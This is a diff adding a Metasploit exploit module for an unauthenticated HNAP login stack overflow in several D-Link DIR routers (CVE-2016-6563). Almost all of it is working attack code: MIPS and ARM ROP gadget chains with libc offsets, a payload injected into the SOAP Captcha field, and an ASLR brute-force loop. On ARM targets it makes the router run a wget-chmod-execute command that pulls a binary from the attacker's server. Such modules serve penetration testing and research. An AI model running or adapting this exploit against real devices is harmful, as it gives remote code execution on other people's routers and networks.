@@ -1,0 +1,300 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+# Payload working status:
+# MIPS:
+#   - all valid payloads working (the ones that we are able to send without null bytes)
+# ARM:
+#  - inline rev/bind shell works (bind... meh sometimes)
+#  - stager rev/bind shell FAIL
+#  - mettle rev/bind fails with sigsegv standalone, but works under strace or gdb...
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Dlink DIR Routers Unauthenticated HNAP Login Stack Buffer Overflow',
+      'Description'    => %q{
+        Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which
+        is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol,
+        which accepts arbitrarily long strings into certain XML parameters and then copies them into
+        the stack.
+        This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested
+        using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and
+        this vulnerability is present in both MIPS and ARM devices.
+        The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a
+        few load and store instructions. Because of this the payloads have to be sent unencoded, which
+        can cause them to fail, although the bind shell seems to work well.
+        For the ARM devices, the inline reverse tcp seems to work best.
+        Check the reference links to see the vulnerable firmware versions.
+      },
+      'Author'         =>
+        [
+          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['linux'],
+      'References'     =>
+        [
+          ['CVE', '2016-6563'],
+          ['US-CERT-VU', '677427'],
+          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt'],
+          ['URL', 'http://seclists.org/fulldisclosure/2016/Nov/38']
+        ],
+      'DefaultOptions' => { 'WfsDelay' => 10 },
+      'Stance'         => Msf::Exploit::Stance::Aggressive,          # we need this to run in the foreground (ARM target)
+      'Targets'        =>
+        [
+          [ 'Dlink DIR-818 / 822 / 823 / 850 [MIPS]',
+            {
+              'Offset'         => 3072,
+              'LibcBase'       => 0x2aabe000,         # should be the same offset for all firmware versions and all routers
+              'Sleep'          => 0x56DF0,            # sleep() offset into libuClibc-0.9.30.3.so
+              'FirstGadget'    => 0x4EA1C,            # see comments below for gadget information
+              'SecondGadget'   => 0x2468C,
+              'ThirdGadget'    => 0x41f3c,
+              'PrepShellcode1' => "\x23\xbd\xf3\xc8", # addi  sp,sp,-3128
+              'PrepShellcode2' => "\x03\xa0\xf8\x09", # jalr  sp
+              'BranchDelay'    => "\x20\x84\xf8\x30", # addi  a0,a0,-2000 (nop)
+              'Arch'           => ARCH_MIPSBE,
+              'Payload'        =>
+                {
+                  'BadChars' => "\x00",
+                  'EncoderType'     => Msf::Encoder::Type::Raw      # else it will fail with SIGILL, this CPU is crippled
+                },
+            }
+          ],
+          [ 'Dlink DIR-868 (rev. B and C) / 880 / 885 / 890 / 895 [ARM]',
+            {
+              'Offset'         => 1024,
+              'LibcBase'       => 0x400DA000,         # we can pick any xyz in 0x40xyz000 (an x of 0/1 works well)
+              'System'         => 0x5A270,            # system() offset into libuClibc-0.9.32.1.so
+              'FirstGadget'    => 0x18298,            # see comments below for gadget information
+              'SecondGadget'   => 0x40CB8,
+              'Arch'           => ARCH_ARMLE,
+            }
+          ],
+        ],
+      'DisclosureDate'  => 'Nov 7 2016',
+      'DefaultTarget'   => 0))
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('SLEEP', [true, 'Seconds to sleep between requests (ARM only)', '0.5']),
+        OptString.new('SRVHOST', [true, 'IP address for the HTTP server (ARM only)', '0.0.0.0']),
+        OptString.new('SRVPORT', [true, 'Port for the HTTP server (ARM only)', '3333']),
+        OptString.new('SHELL', [true, 'Don\'t change this', '/bin/sh']),
+        OptString.new('SHELLARG', [true, 'Don\'t change this', 'sh']),
+      ], self.class)
+  end
+
+  def check
+    begin
+      res = send_request_cgi({
+        'uri'     => '/HNAP1/',
+        'method'  => 'POST',
+        'Content-Type' => 'text/xml',
+        'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' }
+      })
+
+      if res && res.code == 500
+        return Exploit::CheckCode::Detected
+      end
+    rescue ::Rex::ConnectionError
+      return Exploit::CheckCode::Unknown
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def calc_encode_addr (offset, big_endian = true)
+    if big_endian
+      [(target['LibcBase'] + offset).to_s(16)].pack('H*')
+    else
+      [(target['LibcBase'] + offset).to_s(16)].pack('H*').reverse
+    end
+  end
+
+  def prepare_shellcode_arm (cmd)
+    #All these gadgets are from /lib/libuClibc-0.9.32.1.so, which is the library used for all versions of firmware for all ARM routers
+
+    #first_gadget (pops system() address into r3, and second_gadget into PC):
+    #.text:00018298                 LDMFD           SP!, {R3,PC}
+
+    #second_gadget (puts the stack pointer into r0 and calls system() at r3):
+    #.text:00040CB8                 MOV             R0, SP
+    #.text:00040CBC                 BLX             R3
+
+    #system() (Executes argument in r0 (our stack pointer)
+    #.text:0005A270 system
+
+    #The final payload will be:
+    #'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command
+    shellcode = rand_text_alpha(target['Offset']) +       # filler
+      "\xff\xff\xff\xff" +                                # n integer overwrite (see advisory)
+      rand_text_alpha(16) +                               # moar filler
+      rand_text_alpha(4) +                                # r11
+      calc_encode_addr(target['FirstGadget'], false) +    # first_gadget
+      calc_encode_addr(target['System'], false) +         # system() address
+      calc_encode_addr(target['SecondGadget'], false) +   # second_gadget
+      cmd                                                 # our command
+  end
+
+  def prepare_shellcode_mips
+    #All these gadgets are from /lib/libuClibc-0.9.30.3.so, which is the library used for all versions of firmware for all MIPS routers
+
+    #<sleep> is at 56DF0
+
+    #first gadget - execute sleep and call second_gadget
+    #.text:0004EA1C                 move    $t9, $s0 <- sleep()
+    #.text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget
+    #.text:0004EA24                 li      $a0, 2 <- arg for sleep()
+    #.text:0004EA28                 lw      $s0, 0x20+var_8($sp)
+    #.text:0004EA2C                 li      $a1, 1
+    #.text:0004EA30                 move    $a2, $zero
+    #.text:0004EA34                 jr      $t9
+    #.text:0004EA38                 addiu   $sp, 0x20
+
+    #second gadget - put stack pointer in a1:
+    #.text:0002468C                 addiu   $s1, $sp, 0x58
+    #.text:00024690                 li      $s0, 0x44
+    #.text:00024694                 move    $a2, $s0
+    #.text:00024698                 move    $a1, $s1
+    #.text:0002469C                 move    $t9, $s4
+    #.text:000246A0                 jalr    $t9
+    #.text:000246A4                 move    $a0, $s2
+
+    #third gadget - call $a1 (stack pointer):
+    #.text:00041F3C                 move    $t9, $a1
+    #.text:00041F40                 move    $a1, $a2
+    #.text:00041F44                 addiu   $a0, 8
+    #.text:00041F48                 jr      $t9
+    #.text:00041F4C                 nop
+
+    #When the crash occurs, the stack pointer is at xml_tag_value[3128]. In order to have a larger space for the shellcode (2000+ bytes), we can jump back to the beggining of the buffer.
+      #prep_shellcode_1:  23bdf7a8  addi  sp,sp,-3128
+      #prep_shellcode_2:  03a0f809  jalr  sp
+      #branch_delay:    2084f830  addi  a0,a0,-2000
+
+    #The final payload will be:
+    #shellcode + 'a' * (2064 - shellcode.size) + sleep() + '%31' * 4 + '%32' * 4 + '%33' * 4 + third_gadget + first_gadget + 'b' * 0x1c + second_gadget + 'c' * 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay
+    shellcode = payload.encoded +                                        # exploit
+      rand_text_alpha(target['Offset'] - payload.encoded.length) +       # filler
+      calc_encode_addr(target['Sleep']) +                                # s0
+      rand_text_alpha(4) +                                               # s1
+      rand_text_alpha(4) +                                               # s2
+      rand_text_alpha(4) +                                               # s3
+      calc_encode_addr(target['ThirdGadget']) +                          # s4 (third gadget)
+      calc_encode_addr(target['FirstGadget']) +                          # initial pc / ra (first_gadget)
+      rand_text_alpha(0x1c) +                                            # filler
+      calc_encode_addr(target['SecondGadget']) +                         # second_gadget
+      rand_text_alpha(0x58) +                                            # filler
+      target['PrepShellcode1'] +                                         # exploit prep
+      target['PrepShellcode2'] +                                         # exploit prep
+      target['BranchDelay']                                              # exploit prep
+  end
+
+  def send_payload (payload)
+    begin
+      # the payload can go in the Action, Username, LoginPassword or Captcha XML tag
+      body = %{
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+ <soap:Body>
+  <Login xmlns="http://purenetworks.com/HNAP1/">
+   <Action>something</Action>
+   <Username>Admin</Username>
+   <LoginPassword></LoginPassword>
+   <Captcha>#{payload}</Captcha>
+  </Login>
+ </soap:Body>
+</soap:Envelope>
+}
+
+      res = send_request_cgi({
+        'uri'     => '/HNAP1/',
+        'method'  => 'POST',
+        'ctype' => 'text/xml',
+        'headers' => { 'SOAPAction' => 'http://purenetworks.com/HNAP1/Login' },
+        'data' => body
+      })
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the router")
+    end
+  end
+
+  # Handle incoming requests from the server
+  def on_request_uri(cli, request)
+    #print_status("on_request_uri called: #{request.inspect}")
+    if (not @pl)
+      print_error("#{peer} - A request came in, but the payload wasn't ready yet!")
+      return
+    end
+    print_status("#{peer} - Sending the payload to the device...")
+    @elf_sent = true
+    send_response(cli, @pl)
+  end
+
+  def exploit
+    print_status("#{peer} - Attempting to exploit #{target.name}")
+    if target == targets[0]
+      send_payload(prepare_shellcode_mips)
+    else
+      downfile = rand_text_alpha(8+rand(8))
+      @pl = generate_payload_exe
+      @elf_sent = false
+      resource_uri = '/' + downfile
+
+      #do not use SSL
+      if datastore['SSL']
+        ssl_restore = true
+        datastore['SSL'] = false
+      end
+
+      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
+        srv_host = Rex::Socket.source_address(rhost)
+      else
+        srv_host = datastore['SRVHOST']
+      end
+
+      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
+      print_status("#{peer} - Starting up our web service on #{service_url} ...")
+      start_service({'Uri' => {
+        'Proc' => Proc.new { |cli, req|
+          on_request_uri(cli, req)
+        },
+        'Path' => resource_uri
+      }})
+
+      datastore['SSL'] = true if ssl_restore
+      print_status("#{peer} - Asking the device to download and execute #{service_url}")
+
+      filename = rand_text_alpha_lower(rand(8) + 2)
+      cmd = "wget #{service_url} -O /tmp/#{filename}; chmod +x /tmp/#{filename}; /tmp/#{filename} &"
+
+      shellcode = prepare_shellcode_arm(cmd)
+
+      print_status("#{peer} - \"Bypassing\" the device's ASLR. This might take up to 15 minutes.")
+      counter = 0.00
+      while (not @elf_sent)
+        if counter % 50.00 == 0 && counter != 0.00
+          print_status("#{peer} - Tried #{counter.to_i} times in #{(counter * datastore['SLEEP'].to_f).to_i} seconds.")
+        end
+        send_payload(shellcode)
+        sleep datastore['SLEEP'].to_f     # we need to be in the LAN, so a low value  (< 1s) is fine
+        counter += 1
+      end
+      print_status("#{peer} - The device downloaded the payload after #{counter.to_i} tries / #{(counter * datastore['SLEEP'].to_f).to_i} seconds.")
+    end
+  end
+end
